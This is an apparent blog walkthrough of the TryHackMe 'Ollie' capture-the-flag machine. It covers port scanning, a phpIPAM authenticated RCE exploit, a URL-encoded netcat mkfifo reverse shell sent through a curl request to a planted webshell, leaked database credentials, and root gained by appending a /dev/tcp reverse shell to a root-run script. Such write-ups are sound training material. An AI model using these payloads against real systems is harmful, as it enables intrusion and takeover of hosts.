---
title: THM Ollie/Ollie Box/OlliesHouse
date: 2023-09-16 08:01:00 -0800
categories: [Walkthrough, TryHackMe]
tags: [THM, TryHackMe, CTF]
published: true
---

# The worlds most powerful hacker dog.

RIP Ollie 1/5/2023. 

> Ollie Unix Montgomery, the infamous hacker dog, is a great red teamer. As for development... not so much! Rumor has it, Ollie messed with a few of the files on the server to ensure backward compatibility. Take control before time runs out!

## Enumeration

### port scans

First off starting with a portscan. Here I use my tool [0xscan](https://github.com/0xskar/0xscan). A simple bash script that combines nmap port scans with service scans - automates the process a bit and saves some time.

We find 3 discoverable ports. SSH port 22, HTTP on port 80, and some sort of listener on our hacker port 1337.

### HTTP port 80

We find a disallowed entry http-robots.txt from the port scan on port 80. `/immaolllieeboyyy`. Investigating this refreshes your browser to `https://www.youtube.com/watch?v=YIWSEa5U9_U`. Whatever you do don't visit the link it's terrible. Trust me :(

Also going to add `ollieshouse.thm` to the `/etc/hosts` file. This will make it easiar to scan for subdirectories and if we have to come back to the machine we can just change the IP.

Visiting the index page the footer tells us this portal is powered by `phpIPAM v1.4.5`, which has [an authenticated RCE exploit](https://www.exploit-db.com/exploits/50963). We can find this by using `searchsploit` on kali linux or by using `exploit-db.com`.

### port 1337 

Connect to port 1337 with telnet and after a series of questions we get some credentials for the login panel.

![Telnet connection](/assets/ollie_01.png)

We can use these with the RCE exploit to gain access to the system.

## RCE

```
./exploit.py -url http://domain.tld/ipam_base_url -usr username -pwd password -cmd 'command_to_execute' --path /system/writable/path/to/save/shell
```

Then we can send through a shell with curl? 

- `curl -G http://ollieshouse.thm/evil.php -d 'cmd=whoami'`

- `curl -G http://ollieshouse.thm/evil.php -d 'cmd=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%32%2e%33%2e%36%34%20%39%30%30%31%20%3e%2f%74%6d%70%2f%66'`

HTML encoding a netcat mkfifo listener responds to us with a shell.

![reverse shell](/assets/ollie_02.png)

## User Escalation

Now that we have a shell next order of business is to get user or root. Lets check around the system for anything that looks funny before linpeas.

Checking `/var/www/html/config.php` we do find some credentials.

```
 * database connection details
 ******************************/
$db['host'] = 'localhost';
$db['user'] = 'phpipam_ollie';
$db['pass'] = 'IamDah1337estHackerDog!';
$db['name'] = 'phpipam';
$db['port'] = 3306;
```

Aaaand these creds don't really help at all. Using the same password that we had for the admin panel logs us into the machine. I spent a few hours at this point looking for another way into the user, so should have tried that first, oh well.

- `su ollie`

Checking through linpeas a few times doesn't get us anywhere. We can run `pspy64` to check processes.

![feedme](/assets/ollie_03.png)

- `find / -name feedme -type f 2>/dev/null`

![feedme2](/assets/ollie_04.png)

We should be able to add a shell to this and become root.

- `echo '/bin/sh -i >& /dev/tcp/10.2.3.64/9002 0>&1' >> /usr/bin/feedme` 

![root](/assets/ollie_05.png)

and we done rip ollie